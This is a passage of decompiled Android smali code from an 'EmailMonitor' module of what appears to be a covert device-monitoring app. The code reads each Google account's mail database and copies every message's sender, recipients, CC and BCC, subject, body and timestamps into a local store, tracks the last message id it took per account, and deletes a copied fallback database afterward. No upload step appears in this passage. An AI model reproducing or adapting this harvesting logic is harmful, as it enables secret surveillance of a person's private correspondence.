    iget-object v2, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v3, "EmailMonitor::EmailListerUpTo51"

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    const-string v5, "Cursor messages is NULL. Skipping account = "

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v2, v3, v1, v6}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;I)Z

    goto/16 :goto_0

    .line 212
    :cond_9
    :goto_1
    :try_start_2
    invoke-interface {v3}, Landroid/database/Cursor;->moveToNext()Z

    move-result v6

    if-eqz v6, :cond_b

    .line 213
    new-instance v6, Lcom/hp/vd/data/EmailData;

    invoke-direct {v6}, Lcom/hp/vd/data/EmailData;-><init>()V

    const-string v8, "_id"

    .line 215
    invoke-interface {v3, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getInt(I)I

    move-result v8

    invoke-static {v8}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v8

    iput-object v8, v6, Lcom/hp/vd/data/EmailData;->internalId:Ljava/lang/Integer;

    .line 216
    iput-object v1, v6, Lcom/hp/vd/data/EmailData;->account:Ljava/lang/String;

    const-string v8, "conversation"

    .line 217
    invoke-interface {v3, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    iput-object v8, v6, Lcom/hp/vd/data/EmailData;->conversation:Ljava/lang/String;

    const-string v8, "fromAddress"

    .line 219
    invoke-interface {v3, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    iput-object v8, v6, Lcom/hp/vd/data/EmailData;->from:Ljava/lang/String;

    const-string v8, "toAddresses"

    .line 220
    invoke-interface {v3, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    iput-object v8, v6, Lcom/hp/vd/data/EmailData;->to:Ljava/lang/String;

    const-string v8, "ccAddresses"

    .line 221
    invoke-interface {v3, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    iput-object v8, v6, Lcom/hp/vd/data/EmailData;->cc:Ljava/lang/String;

    const-string v8, "bccAddresses"

    .line 222
    invoke-interface {v3, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    iput-object v8, v6, Lcom/hp/vd/data/EmailData;->bcc:Ljava/lang/String;

    const-string v8, "subject"

    .line 224
    invoke-interface {v3, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    iput-object v8, v6, Lcom/hp/vd/data/EmailData;->subject:Ljava/lang/String;

    const-string v8, "body"

    .line 225
    invoke-interface {v3, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v8

    iput-object v8, v6, Lcom/hp/vd/data/EmailData;->body:Ljava/lang/String;

    const-string v8, "bodyCompressed"

    .line 227
    invoke-interface {v3, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getBlob(I)[B

    move-result-object v8

    if-eqz v8, :cond_a

    .line 228
    array-length v9, v8
    :try_end_2
    .catch Ljava/lang/Throwable; {:try_start_2 .. :try_end_2} :catch_2

    if-lez v9, :cond_a

    .line 231
    :try_start_3
    invoke-static {v8, v5}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v8

    iput-object v8, v6, Lcom/hp/vd/data/EmailData;->bodyCompressed:Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/IllegalStateException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/lang/Throwable; {:try_start_3 .. :try_end_3} :catch_2

    :catch_0
    :cond_a
    :try_start_4
    const-string v8, "dateSentMs"

    .line 245
    invoke-interface {v3, v8}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v8

    invoke-interface {v3, v8}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v8

    invoke-static {v8, v9}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v8

    const-string v9, "dateReceivedMs"

    .line 246
    invoke-interface {v3, v9}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v9

    invoke-interface {v3, v9}, Landroid/database/Cursor;->getLong(I)J

    move-result-wide v9

    invoke-static {v9, v10}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v9

    .line 248
    new-instance v10, Ljava/util/Date;

    invoke-virtual {v8}, Ljava/lang/Long;->longValue()J

    move-result-wide v11

    invoke-direct {v10, v11, v12}, Ljava/util/Date;-><init>(J)V

    iput-object v10, v6, Lcom/hp/vd/data/EmailData;->sentAt:Ljava/util/Date;

    .line 249
    new-instance v8, Ljava/util/Date;

    invoke-virtual {v9}, Ljava/lang/Long;->longValue()J

    move-result-wide v9

    invoke-direct {v8, v9, v10}, Ljava/util/Date;-><init>(J)V

    iput-object v8, v6, Lcom/hp/vd/data/EmailData;->receivedAt:Ljava/util/Date;
    :try_end_4
    .catch Ljava/lang/Throwable; {:try_start_4 .. :try_end_4} :catch_2

    .line 252
    :try_start_5
    iget-object v8, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->emailDao:Lcom/j256/ormlite/dao/Dao;

    invoke-interface {v8, v6}, Lcom/j256/ormlite/dao/Dao;->create(Ljava/lang/Object;)I

    .line 253
    iget-object v6, v6, Lcom/hp/vd/data/EmailData;->internalId:Ljava/lang/Integer;

    invoke-virtual {v6}, Ljava/lang/Integer;->intValue()I

    move-result v6

    .line 260
    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "max_id_"

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-interface {v4, v8, v6}, Landroid/content/SharedPreferences$Editor;->putInt(Ljava/lang/String;I)Landroid/content/SharedPreferences$Editor;

    .line 261
    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;->commit()Z
    :try_end_5
    .catch Ljava/sql/SQLException; {:try_start_5 .. :try_end_5} :catch_1
    .catch Ljava/lang/Throwable; {:try_start_5 .. :try_end_5} :catch_2

    goto/16 :goto_1

    .line 265
    :catch_1
    :try_start_6
    iget-object v6, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v8, "EmailMonitor::EmailListerUpTo51"

    const-string v9, "Could not persist an Email"

    invoke-interface {v6, v8, v9}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_6
    .catch Ljava/lang/Throwable; {:try_start_6 .. :try_end_6} :catch_2

    goto/16 :goto_1

    :catch_2
    move-exception v1

    .line 271
    iget-object v4, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v5, "EmailMonitor::EmailListerUpTo51"

    const-string v6, "General exception caught in EmailLister:run()"

    invoke-interface {v4, v5, v6, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_b
    if-eqz v3, :cond_c

    .line 275
    invoke-interface {v3}, Landroid/database/Cursor;->close()V

    :cond_c
    if-eqz v2, :cond_d

    .line 279
    invoke-virtual {v2}, Landroid/database/sqlite/SQLiteDatabase;->close()V

    .line 287
    :cond_d
    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->fallbackDatabaseFile:Ljava/io/File;

    if-eqz v1, :cond_1

    .line 289
    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->fallbackDatabaseFile:Ljava/io/File;

    invoke-virtual {v1}, Ljava/io/File;->delete()Z

    .line 290
    iput-object v7, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->fallbackDatabaseFile:Ljava/io/File;

    goto/16 :goto_0

    :catch_3
    move-exception v2

    .line 200
    iget-object v3, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v4, "EmailMonitor::EmailListerUpTo51"

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "SQLIteException caught while executing raw query. Skipping account = "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-interface {v3, v4, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto/16 :goto_0

    .line 294
    :cond_e
    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->moduleData:Lcom/hp/vd/data/ModuleData;

    if-eqz v0, :cond_f

    .line 296
    :try_start_7
    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v0, v1}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I
    :try_end_7
    .catch Ljava/sql/SQLException; {:try_start_7 .. :try_end_7} :catch_5
    .catch Ljava/lang/IllegalStateException; {:try_start_7 .. :try_end_7} :catch_4

    goto :goto_2

    :catch_4
    move-exception v0

    .line 304
    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EmailMonitor::EmailListerUpTo51"

    const-string v3, "Exception caught while persisting module data"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    goto :goto_2

    .line 299
    :catch_5
    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "EmailMonitor::EmailListerUpTo51"

    const-string v2, "COULD NOT PERSIST LIST_ON_START = FALSE"

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    :cond_f
    :goto_2
    return-void

    .line 95
    :cond_10
    :goto_3
    iget-object v0, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v1, "EmailMonitor::EmailListerUpTo51"

    const-string v2, "start(): no accounts detected. Stopping here."

    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return-void

    :catch_6
    move-exception v0

    .line 89
    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EmailMonitor::EmailListerUpTo51"

    const-string v3, "RuntimeException caught while finding google accounts"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_7
    move-exception v0

    .line 84
    iget-object v1, p0, Lcom/hp/vd/module/monitor/email/EmailListerUpTo51;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "EmailMonitor::EmailListerUpTo51"

    const-string v3, "NullPointerException caught while finding google accounts"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method
